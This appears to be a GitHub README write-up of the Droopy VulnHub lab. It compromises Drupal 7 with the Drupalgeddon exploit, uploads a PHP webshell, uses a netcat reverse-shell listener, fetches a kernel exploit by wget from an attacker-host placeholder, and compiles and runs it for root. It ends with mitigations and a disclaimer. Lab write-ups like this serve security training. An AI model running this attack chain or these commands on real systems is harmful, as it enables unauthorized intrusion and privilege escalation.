# 🛡️ Droopy (VulnHub) – Remote Exploitation & Privilege Escalation

## 📌 Description

This project demonstrates the complete compromise of the **Droopy (VulnHub)** machine by exploiting an outdated **Drupal 7 CMS** and leveraging a **kernel-based privilege escalation vulnerability**. The attack chain includes reconnaissance, vulnerability identification, exploitation, and achieving **root access**.

⚠️ **Note:** This testing was performed in a controlled lab environment for educational purposes only.

---

## 🛠 Tools Used

* Nmap
* Nikto
* Searchsploit
* Python3
* Netcat
* GCC Compiler
* Kali Linux

---

## 🧪 Vulnerability Type

* Outdated CMS (Drupal 7)
* SQL Injection (Exploit-based)
* Remote Code Execution (RCE)
* Kernel Privilege Escalation

---

## Methodology

The following methodology was used during the assessment:

* Performed network scanning to identify open ports
* Enumerated web application for technologies and vulnerabilities
* Identified outdated Drupal CMS
* Researched publicly available exploits
* Gained initial access via exploit
* Uploaded webshell for command execution
* Performed local enumeration
* Escalated privileges using kernel exploit
* Achieved full system compromise

---

## 🔍 Exploitation Steps

### 1️⃣ Reconnaissance

* Performed Nmap scan to identify open ports
* Found HTTP service running on port 80

```bash
nmap -sC -sV <TARGET_IP>
```

📸 Screenshot:
https://github.com/Salik921/Droopy-Vuln-Hub-Writeup/blob/5487ed0030f1d058baf47b3cd27aa3d136b0d5e2/Screenshot%202026-03-24%20203608.png

---

### 2️⃣ Enumeration

* Used Nikto to scan web server
* Identified Drupal CMS
* Manual inspection confirmed Drupal structure

```bash
nikto -h http://<TARGET_IP>
```

📸 Screenshot:
https://github.com/Salik921/Droopy-Vuln-Hub-Writeup/blob/51f97365df72d89fd14865bccbd0155db72d9b4f/Screenshot%202026-03-24%20203812.png

---

### 3️⃣ Vulnerability Identification

* Searched for known vulnerabilities using Searchsploit

```bash
searchsploit drupal 7
```

* Found multiple exploits targeting Drupal 7
* Confirmed that the CMS version is outdated and vulnerable

📸 Screenshot:
https://github.com/Salik921/Droopy-Vuln-Hub-Writeup/blob/51f97365df72d89fd14865bccbd0155db72d9b4f/Screenshot%202026-03-24%20204215.png

---

### 4️⃣ Exploitation

* Used Drupal exploit (34992.py)

```bash
python3 34992.py -t http://<192.168.10.14>/ -u admin2 -p admin2
```
📌 Drupalgeddon SQL Injection Exploit (34992.py)

This script (34992.py) is a Python-based exploit targeting a critical SQL Injection vulnerability in Drupal 7 (versions 7.0 to 7.31), widely known as Drupalgeddon.

The vulnerability exists due to improper handling of user-supplied input in database queries, allowing attackers to inject malicious SQL commands without authentication.

⚙️ Impact
Unauthorized database access
Administrator account creation
Full website compromise
Remote Code Execution (in some scenarios)

* Successfully created administrator account
* Gained access to admin panel

📸 Screenshot:
https://github.com/Salik921/Droopy-Vuln-Hub-Writeup/blob/51f97365df72d89fd14865bccbd0155db72d9b4f/Screenshot%202026-03-24%20204425.png
---

### 5️⃣ Initial Access (Webshell)

* Navigated to "Add Content" in admin panel
* Uploaded malicious PHP webshell
* Started Netcat listener

```bash
nc -lvnp 4444
```

* Triggered reverse shell

📸 Screenshot:
https://github.com/Salik921/Droopy-Vuln-Hub-Writeup/blob/51f97365df72d89fd14865bccbd0155db72d9b4f/Screenshot%202026-03-24%20205117.png

---

### 6️⃣ Post Exploitation

* Enumerated system information

```bash
uname -a
lsb_release -a
```

* Identified kernel version

📸 Screenshot:
https://github.com/Salik921/Droopy-Vuln-Hub-Writeup/blob/51f97365df72d89fd14865bccbd0155db72d9b4f/Screenshot%202026-03-24%20205117.png

---

### 7️⃣ Privilege Escalation

* Searched for kernel exploits

```bash
searchsploit linux kernel
```

* Found exploit (37292.c)

### Transfer Exploit

```bash
python3 -m http.server 8000
wget http://<ATTACKER_IP>:8000/37292.c
```

### Compile & Execute

```bash
gcc 37292.c -o exploit
chmod +x exploit
./exploit
```

* Root access successfully obtained

📸 Screenshot:
(Add root shell screenshot)

---

## 💥 Impact

* Full system compromise
* Root-level access achieved
* Ability to execute arbitrary commands

---

## 🔐 Mitigation & Prevention

* Keep CMS updated (avoid outdated Drupal versions)
* Apply security patches regularly
* Disable unnecessary modules
* Restrict admin access
* Monitor logs for suspicious activity
* Harden Linux kernel and restrict exploit vectors

---

## 📚 Learning Outcome

This project demonstrates real-world penetration testing workflow including:

* Web application enumeration
* Exploit research and usage
* Gaining initial access via CMS vulnerabilities
* Privilege escalation techniques
* Achieving full system compromise

---

## ⚠️ Disclaimer

This project is for **educational purposes only**. Do not attempt to exploit systems without proper authorization.

---

## 👨‍💻 Author

**Salik Karimkhan**

* Aspiring Penetration Tester 💀
